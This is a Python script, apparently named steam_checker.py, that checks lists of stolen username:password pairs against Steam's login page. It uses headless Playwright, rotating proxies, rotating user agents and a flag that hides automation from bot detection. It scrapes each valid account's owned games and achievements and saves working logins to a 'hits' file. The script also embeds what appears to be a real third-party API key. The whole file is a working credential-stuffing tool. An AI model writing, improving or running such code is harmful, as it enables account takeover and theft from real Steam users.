import asyncio, aiofiles, json, sys, os, time, random, requests
from playwright.async_api import async_playwright
from typing import List, Tuple
# ---------- COLORAMA ----------
from colorama import init, Fore, Style
init(autoreset=True) # auto-reset colors after each print
# ---------- BS4 and RE ----------
from bs4 import BeautifulSoup
import re
# ---------- UA ROTATION ----------
SCRAPEOPS_API_KEY = '3c338622-eb18-4641-9009-368a65f67b48'
def get_ua_list() -> List[str]:
    try:
        url = f"http://headers.scrapeops.io/v1/user-agents?api_key={SCRAPEOPS_API_KEY}&device=desktop"
        return requests.get(url, timeout=5).json().get("result", [])
    except:
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.864.48 Safari/537.36 Edg/91.0.864.48"
        ]
# ---------- ACCOUNT CHECK ----------
async def check_account(page, username: str, password: str) -> Tuple[str, str, int, List[dict]]:
    try:
        await page.context.clear_cookies()
        await page.goto("https://store.steampowered.com/login/", wait_until="networkidle")
        await page.wait_for_selector('input[type="email"], input[type="text"]', timeout=10000)
        await page.fill('input[type="text"], input[type="email"]', username)
        await page.fill('input[type="password"]', password)
        await page.click('button[type="submit"], .login_btn')
        # outcomes
        try:
            await page.wait_for_selector('#twofactorcode_entry', timeout=5000)
            return username, password, 0, [] # 2FA
        except:
            pass
        try:
            await page.wait_for_selector('div._1W_6HXiG4JJ0By1qN_0fGZ', timeout=5000)
            return username, password, 0, [] # bad creds
        except:
            pass
        # steam banner
        body = await page.text_content("body") or ""
        if "Something went wrong while attempting to sign you in" in body:
            return username, password, 0, [] # LOGIN_BLOCKED_BY_STEAM
        # steam id extraction
        steam_id = None
        cookies = await page.context.cookies()
        for c in cookies:
            if c['name'] == 'steamLoginSecure':
                steam_id = c['value'].split('%7C')[0]
                break
        if not steam_id:
            await page.goto("https://store.steampowered.com/account/", wait_until="networkidle")
            url = page.url
            steam_id = url.split('profiles/')[1].split('/')[0] if 'profiles/' in url else None
        if not steam_id:
            return username, password, 0, []
        if steam_id:
            await page.goto(f"https://steamcommunity.com/profiles/{steam_id}/games/?tab=all",
                            wait_until="networkidle")
            await page.wait_for_selector('div._3tY9vKLCmyG2H2Q4rUJpkr', timeout=10000)
            html = await page.content()
            soup = BeautifulSoup(html, 'html.parser')
            all_games_option = soup.find('option', value="all")
            total_games = 0
            if all_games_option:
                total_games_text = all_games_option.text.strip()
                match = re.search(r'\((\d+)\)', total_games_text)
                if match:
                    total_games = int(match.group(1))
            games_div = soup.find('div', class_='_3tY9vKLCmyG2H2Q4rUJpkr Panel Focusable')
            games = []
            if games_div:
                game_items = games_div.find_all('div', class_='_2-pQFn1G7dZ7667rrakcU3 Panel Focusable')
                for item in game_items:
                    game = {}
                    name_span = item.find('span', class_='w6q9piMq3gT16oj_lEvpy')
                    if name_span:
                        game['name'] = name_span.text.strip()
                    achievements = item.find('span', class_='_1YRRMk6X7vrOL-02K-q1pf')
                    if achievements:
                        game['achievements'] = achievements.text.strip()
                    if 'name' in game:
                        games.append(game)
            return username, password, total_games, games
    except Exception as e:
        return username, password, 0, []
    # Safeguard return in case somehow missed
    return username, password, 0, []
# ---------- PROXY AND UA CHECK ----------
async def check_proxy_and_ua(browser, proxy, ua):
    match = re.search(r'-ip-([\d.]+)', proxy['username'])
    expected_ip = match.group(1) if match else None
    ctx = await browser.new_context(viewport={"width": 1280, "height": 720}, user_agent=ua, proxy=proxy)
    page = await ctx.new_page()
    try:
        # Check IP
        await page.goto('https://httpbin.org/ip', timeout=30000)
        text = await page.inner_text('body')
        ip_data = json.loads(text)
        if expected_ip:
            if expected_ip not in ip_data['origin']:
                print(f"{Fore.RED}Proxy IP check failed for {proxy['server']}: Expected {expected_ip}, got {ip_data['origin']}{Style.RESET_ALL}")
                return False
        # Check User-Agent
        await page.goto('https://httpbin.org/user-agent', timeout=30000)
        text = await page.inner_text('body')
        ua_data = json.loads(text)
        if ua_data['user-agent'] != ua:
            print(f"{Fore.RED}User-Agent check failed for {proxy['server']}: Expected {ua}, got {ua_data['user-agent']}{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}Proxy and User-Agent check passed for {proxy['server']}.{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}Check failed for {proxy['server']}: {str(e)}{Style.RESET_ALL}")
        return False
    finally:
        await ctx.close()
# ---------- LOAD PROXIES ----------
def load_proxies(file_path: str = "proxy.txt") -> List[dict]:
    proxies = []
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}Proxy file not found: {file_path}{Style.RESET_ALL}")
        return proxies
    with open(file_path, encoding="utf-8", errors="ignore") as f:
        for ln in f:
            ln = ln.strip()
            if ln and ln.count(":") == 3:
                host, port, username, password = ln.split(":")
                server = f"http://{host}:{port}"
                proxies.append({
                    "server": server,
                    "username": username,
                    "password": password
                })
    return proxies
# ---------- MAIN LOOP ----------
async def process_account_file(file_path: str):
    uas = get_ua_list()
    if not uas:
        uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
    with open(file_path, encoding="utf-8", errors="ignore") as f:
        accounts = [ln.strip() for ln in f if ":" in ln]
    if not accounts:
        print(f"{Fore.RED}No valid accounts found.{Style.RESET_ALL}")
        return
    proxies = load_proxies()
    if not proxies:
        print(f"{Fore.RED}No valid proxies found. Aborting.{Style.RESET_ALL}")
        return
    print(f"{Fore.CYAN}Processing {len(accounts)} accounts with rotating UAs and {len(proxies)} proxies.{Style.RESET_ALL}")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        working_proxies = []
        test_ua = random.choice(uas)
        for proxy in proxies:
            if await check_proxy_and_ua(browser, proxy, test_ua):
                working_proxies.append(proxy)
        if not working_proxies:
            print(f"{Fore.RED}No working proxies found. Aborting.{Style.RESET_ALL}")
            await browser.close()
            return
        print(f"{Fore.GREEN}{len(working_proxies)} working proxies ready.{Style.RESET_ALL}")
        for idx, acc in enumerate(accounts, 1):
            ua = random.choice(uas)
            print(f"{Fore.CYAN}Using UA for account {idx}: {ua}{Style.RESET_ALL}")
            username, password = acc.split(":", 1)
            username, password = username.strip(), password.strip()
            proxy = random.choice(working_proxies)
            print(f"{Fore.CYAN}Using proxy for account {idx}: {proxy['server']}{Style.RESET_ALL}")
            ctx = await browser.new_context(viewport={"width": 1280, "height": 720}, user_agent=ua, proxy=proxy)
            page = await ctx.new_page()
            print(f"{Fore.YELLOW}[{idx}/{len(accounts)}] {username}{Style.RESET_ALL}", end=" → ")
            try:
                u, p, total_games, games = await check_account(page, username, password)
                if games or total_games > 0:
                    hit = f"{u}:{p} | total_games={total_games} | games={json.dumps(games, ensure_ascii=False)}"
                    print(f"{Fore.GREEN}✓ HIT{Style.RESET_ALL}")
                    async with aiofiles.open("hits.txt", "a", encoding="utf-8") as hf:
                        await hf.write(hit + "\n")
                else:
                    print(f"{Fore.RED}✗{Style.RESET_ALL}")
            finally:
                await ctx.close()
        await browser.close()
# ---------- ENTRY ----------
async def main():
    if len(sys.argv) != 2:
        print(f"{Fore.MAGENTA}Usage: python steam_checker.py accounts.txt{Style.RESET_ALL}")
        return
    fp = sys.argv[1]
    if not os.path.isfile(fp):
        print(f"{Fore.RED}File not found.{Style.RESET_ALL}")
        return
    if os.path.exists("hits.txt"):
        os.remove("hits.txt")
    start = time.time()
    await process_account_file(fp)
    print(f"{Fore.CYAN}\nDone in {time.time()-start:.1f}s — check hits.txt{Style.RESET_ALL}")
if __name__ == "__main__":
    asyncio.run(main())